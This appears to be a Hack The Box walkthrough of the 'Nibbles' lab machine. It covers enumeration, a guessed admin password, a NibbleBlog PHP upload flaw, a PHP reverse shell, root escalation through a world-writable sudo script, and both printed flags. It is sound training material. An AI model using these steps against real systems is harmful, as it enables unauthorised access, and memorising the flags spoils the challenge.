{"title":"HTB - Nibbles","slug":"Nibbles","html":"<h1 id=\"nibbles---10101075\">Nibbles - 10.10.10.75</h1>\n<h1 id=\"enumeration\">Enumeration</h1>\n<h2 id=\"nmap\">Nmap</h2>\n<pre class=\"language-bash\"><code class=\"language-bash\">nmap -sC -sV -oA nmap/initial 10.10.10.75</code></pre><pre class=\"language-bash\"><code class=\"language-bash\">Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-26 21:14 EDT\nNmap scan report for 10.10.10.75\nHost is up (0.24s latency).\nNot shown: 998 closed ports\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey:\n|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)\n|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)\n|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)\n80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))\n|_http-server-header: Apache/2.4.18 (Ubuntu)\n|_http-title: Site does not have a title (text/html).\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 39.85 seconds</code></pre><h2 id=\"website\">Website</h2>\n<pre class=\"language-bash\"><code class=\"language-bash\">curl -svk \"http://10.10.10.75\" | grep . </code></pre><p>The command above is a quick way to see what is on the webpage without opening it in a browser. And it shows much more than what is displayed on the browser such as <strong>headers</strong> and <strong>html comments</strong>. The server header can be crossed check with the nmap results. The comment indicates that there is a directory named <strong>nibbleblog</strong> on the server.</p>\n<p><img src=\"Nibbles.assets/image-20210426221502521.png\" alt=\"\"></p>\n<h2 id=\"gobuster\">Gobuster</h2>\n<p>Enumerating the Apache webserver with gobuster.</p>\n<pre class=\"language-bash\"><code class=\"language-bash\">gobuster dir -t 50 -w /usr/share/seclists/Discovery/Web-Content/common.txt -o log/gobuster.out -u http://10.10.10.75/nibbleblog</code></pre><pre class=\"language-bash\"><code class=\"language-bash\">/.htpasswd            (Status: 403) [Size: 306]\n/README               (Status: 200) [Size: 4628]\n/admin                (Status: 301) [Size: 321] [--> http://10.10.10.75/nibbleblog/admin/]\n/admin.php            (Status: 200) [Size: 1401]\n/content              (Status: 301) [Size: 323] [--> http://10.10.10.75/nibbleblog/content/]\n/index.php            (Status: 200) [Size: 2992]\n/languages            (Status: 301) [Size: 325] [--> http://10.10.10.75/nibbleblog/languages/]\n/plugins              (Status: 301) [Size: 323] [--> http://10.10.10.75/nibbleblog/plugins/]\n/themes               (Status: 301) [Size: 322] [--> http://10.10.10.75/nibbleblog/themes/]</code></pre><pre class=\"language-bash\"><code class=\"language-bash\">curl -sk \"http://10.10.10.75/nibbleblog/README\"</code></pre><p>Upon inspecting the <strong>README</strong> file, the <strong>version</strong>, <strong>release date</strong> and <strong>technologies</strong> used by the Content Management System (CMS) is discovered.</p>\n<p><img src=\"Nibbles.assets/image-20210426223306827.png\" alt=\"\"></p>\n<pre class=\"language-bash\"><code class=\"language-bash\">curl -sk \"http://10.10.10.75/nibbleblog/content/\"</code></pre><p>When viewing the content page, it has directory listing enable.</p>\n<p><img src=\"Nibbles.assets/image-20210426223956036.png\" alt=\"\"></p>\n<p><img src=\"Nibbles.assets/image-20210426224823227.png\" alt=\"\"></p>\n<p>On viewing the <a target=\"_blank\" rel=\"nofollow\" href=\"http://10.10.10.75/nibbleblog/content/private/users.xml\">http://10.10.10.75/nibbleblog/content/private/users.xml</a> file, there is only one user, <strong>admin</strong>, and it appears to have an <strong>IP filtering blacklist</strong>.</p>\n<p><img src=\"Nibbles.assets/image-20210426225010279.png\" alt=\"\"></p>\n<p>Since it is likely that the attacker gets blocked if they try a password bruteforce attack, the config file can be used as a hint for potential password. Also <strong>nibbleblog does not offer any default credentials</strong> that can be used.</p>\n<p>Potential password for user <strong>admin</strong>: </p>\n<ul>\n<li>admin</li>\n<li>nibbleblog</li>\n<li>nibbles</li>\n<li>yumyum</li>\n</ul>\n<p><img src=\"Nibbles.assets/image-20210426225731825.png\" alt=\"\"></p>\n<p>Bad login attempts are recorded with the attacker&#39;s IP.</p>\n<p><img src=\"Nibbles.assets/image-20210426230421923.png\" alt=\"\"></p>\n<p>The attacker can successfully login using the credentials <strong><code>admin:nibbles</code></strong>.</p>\n<p><img src=\"Nibbles.assets/image-20210426230436563.png\" alt=\"\"></p>\n<h2 id=\"searchsploit\">Searchsploit</h2>\n<p>Searchsploit is used to search for a known exploit for: <strong>nibbleblog</strong></p>\n<pre class=\"language-bash\"><code class=\"language-bash\">searchsploit nibbleblog</code></pre><p><img src=\"Nibbles.assets/image-20210426230732546.png\" alt=\"\"></p>\n<p>A metasploit exploit can be found for this exact nibbleblog version.</p>\n<h1 id=\"exploitation\">Exploitation</h1>\n<h3 id=\"vulnerability-explanation\"><strong>Vulnerability Explanation:</strong></h3>\n<p>When uploading image files via the &quot;My image&quot; plugin - which is delivered with NibbleBlog by default - , NibbleBlog 4.0.3 keeps the original extension of uploaded files. This extension or the actual file type are not checked, thus it is possible to upload PHP files and gain code execution. </p>\n<p>source: <a target=\"_blank\" rel=\"nofollow\" href=\"https://packetstormsecurity.com/files/133425/NibbleBlog-4.0.3-Shell-Upload.html\">https://packetstormsecurity.com/files/133425/NibbleBlog-4.0.3-Shell-Upload.html</a></p>\n<h3 id=\"proof-of-concept\">Proof Of Concept</h3>\n<p>The metasploit exploit can be easily replicated manually without using metasploit.</p>\n<p>A simple php script is created. When testing exploits, it is highly recommended to keep the proof of concept as simple as possible as it is less likely to be blocked. </p>\n<p>Example: <code>echo</code> is less likely to be blocked compared to <code>exec</code> or <code>system</code>. </p>\n<pre class=\"language-php\"><code class=\"language-php\"><span class=\"token prolog\">&lt;?php \n    echo \"test test test\";\n?></span></code></pre><p>Upload URL: <a target=\"_blank\" rel=\"nofollow\" href=\"http://10.10.10.75/nibbleblog/admin.php?controller=plugins&amp;action=config&amp;plugin=my_image\">http://10.10.10.75/nibbleblog/admin.php?controller=plugins&amp;action=config&amp;plugin=my_image</a></p>\n<p>RCE URL: <a target=\"_blank\" rel=\"nofollow\" href=\"http://10.10.10.75/nibbleblog/content/private/plugins/my_image/image.php\">http://10.10.10.75/nibbleblog/content/private/plugins/my_image/image.php</a></p>\n<p><img src=\"Nibbles.assets/image-20210426235230027.png\" alt=\"\"></p>\n<p><img src=\"Nibbles.assets/image-20210426235348283.png\" alt=\"\"></p>\n<h3 id=\"getting-a-reverse-shell\">Getting a reverse shell</h3>\n<p>On kali linux, these are some default location where php reverse shells can be found.</p>\n<pre class=\"language-bash\"><code class=\"language-bash\">$ locate php-reverse                                                                             \n/usr/share/laudanum/php/php-reverse-shell.php\n/usr/share/laudanum/wordpress/templates/php-reverse-shell.php\n/usr/share/seclists/Web-Shells/laudanum-0.8/php/php-reverse-shell.php\n/usr/share/webshells/php/php-reverse-shell.php</code></pre><pre class=\"language-bash\"><code class=\"language-bash\">cp /usr/share/laudanum/php/php-reverse-shell.php shell.php</code></pre><p>Editing the php reverse shell to connect to the attacker&#39;s IP address.</p>\n<p><img src=\"Nibbles.assets/image-20210427000705549.png\" alt=\"\"></p>\n<p>The attacker then uploads the shell.php and sets up <strong>nc</strong> to listen for an incoming connection on port <strong>8888</strong>.</p>\n<p><img src=\"Nibbles.assets/image-20210427000953310.png\" alt=\"\"></p>\n<p>The reverse shell is then stabilised using the following commands.</p>\n<pre class=\"language-bash\"><code class=\"language-bash\">which python3 # to know which python version exists\npython3 -c 'import pty;pty.spawn(\"/bin/bash\")' # gets a proper tty shell\n# the shell is then backgrounded using ctrl+z\nstty raw -echo # this is executed on the attackers machine\n# then press fg to resume the tty shell\nexport TERM=xterm # after setting the terminal type, the screen can now be cleared\nstty rows 42 cols 172 # sets the size for the tty shell</code></pre><p><img src=\"Nibbles.assets/image-20210427001449345.png\" alt=\"\"></p>\n<h3 id=\"usertxt\">User.txt</h3>\n<pre class=\"language-bash\"><code class=\"language-bash\">find /home -type f -ls 2>/dev/null</code></pre><p>The above command finds everything having the type <strong>file</strong> in the directory <strong>/home</strong>, as well as listing all the attributes of each file and finally <strong>2&gt;/dev/null</strong> is used to redirect <strong>standard error</strong> to <strong>/dev/null</strong>.</p>\n<p><img src=\"Nibbles.assets/image-20210427002323525.png\" alt=\"\"></p>\n<p><strong>User.txt</strong> can be found in the home directory of <strong>nibbler</strong>.</p>\n<pre class=\"language-bash\"><code class=\"language-bash\">cat /home/nibbler/user.txt</code></pre><p><img src=\"Nibbles.assets/image-20210427002522089.png\" alt=\"\"></p>\n<blockquote>\n<p>user.txt flag: <code>41c963a4678306c21c790c4bb0dff71d</code></p>\n</blockquote>\n<h1 id=\"post-exploitation\">Post Exploitation</h1>\n<h2 id=\"privilege-escalation-to-root\">Privilege Escalation to Root</h2>\n<p>As can be seen below, the user <strong>nibbler</strong> can execute the file <strong>/home/nibbler/personal/stuff/monitor.sh</strong> <em>without the need of a password</em>.</p>\n<pre class=\"language-bash\"><code class=\"language-bash\">sudo -l\n...[snip]...\nUser nibbler may run the following commands on Nibbles:\n    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh</code></pre><pre class=\"language-bash\"><code class=\"language-bash\">unzip personal.zip\nls -la personal/stuff/monitor.sh\n-rwxrwxrwx 1 nibbler nibbler 4015 May  8  2015 personal/stuff/monitor.sh</code></pre><p><img src=\"Nibbles.assets/image-20210427004215618.png\" alt=\"\"></p>\n<h3 id=\"vulnerability-explanation-1\"><strong>Vulnerability Explanation:</strong></h3>\n<p>The file <strong>/home/nibbler/personal/stuff/monitor.sh</strong> is world-writable. The content of the file can be modified to drop a shell. When running the file as root, the attacker will be get a root shell.</p>\n<pre class=\"language-bash\"><code class=\"language-bash\"># line in added at the top of the script, just after the shebang line.\n/bin/bash -p </code></pre><p><img src=\"Nibbles.assets/image-20210427004934185.png\" alt=\"\"> </p>\n<p><img src=\"Nibbles.assets/image-20210427005056993.png\" alt=\"\"></p>\n<h3 id=\"roottxt\">Root.txt</h3>\n<p>the <strong>root.txt</strong> file is always located in <strong>/root/</strong></p>\n<pre class=\"language-bash\"><code class=\"language-bash\">cat /root/root.txt</code></pre><p><img src=\"Nibbles.assets/image-20210427005421970.png\" alt=\"\"></p>\n<blockquote>\n<p>root.txt flag: <code>d9ae263a345701460f51766ae70e5e26</code></p>\n</blockquote>\n","date":"2021-04-27","excerpt":"","printDate":"April 27, 2021","printReadingTime":"5 min read"}